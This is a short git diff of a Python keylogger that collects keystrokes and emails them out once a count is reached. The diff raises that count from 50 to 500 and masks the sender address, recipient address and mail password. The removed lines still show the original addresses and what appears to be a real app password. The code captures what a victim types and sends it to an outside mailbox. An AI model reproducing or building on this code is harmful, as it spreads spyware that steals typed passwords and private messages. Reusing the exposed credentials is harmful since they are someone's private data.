@@ -23,14 +23,14 @@ def log_happykey(key):
     keystrokes += key
 
     
-    if len(keystrokes) >= 50:
+    if len(keystrokes) >= 500:
         send_email_with_content(keystrokes)
         keystrokes = ""  #Reset keystrokes after sending the email
 
 def send_email_with_content(content):
-    from_email = "anonymouslymaking@gmail.com"
-    to_email = "teleporting69@yahoo.com"
-    password = "lbno culn mltk cxre"
+    from_email = "******************@gmail.com"
+    to_email = "******************@yahoo.com"
+    password = "**** **** **** ****"
 
     msg = MIMEMultipart()
     msg['From'] = from_email
